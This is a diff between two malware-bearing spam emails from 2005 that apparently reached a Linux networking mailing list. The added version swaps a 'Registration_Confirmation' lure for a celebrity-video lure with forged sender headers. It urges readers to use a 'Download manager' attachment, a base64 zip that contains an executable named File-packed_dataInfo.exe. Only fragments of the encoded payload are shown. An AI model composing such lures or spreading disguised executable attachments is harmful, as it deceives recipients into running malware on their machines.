@@ -1,29 +1,30 @@
-From: postman@allstartranslators.de.sgi.com
-Subject: Registration_Confirmation
-Date: Thu, 08 Dec 2005 01:23:44 UTC
-Message-ID: <6e240570c5.edba19@allstartranslators.de>
+From: hostmaster@netscape.com
+Subject: Paris Hilton & Nicole Richie
+Date: Thu, 08 Dec 2005 01:13:20 GMT
+Message-ID: <b0f5f3b18af1.9fa@netscape.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==b18e3e.b0915dea86d6"
+Content-Type: multipart/mixed; boundary="==0f11ff20a6.8bfbf398ff0"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: Z-User@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==b18e3e.b0915dea86d6
+--==0f11ff20a6.8bfbf398ff0
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.allstartranslators.de
-***** Email: postman@allstartranslators.de
---==b18e3e.b0915dea86d6
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--==0f11ff20a6.8bfbf398ff0
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==b18e3e.b0915dea86d6--
+--==0f11ff20a6.8bfbf398ff0--
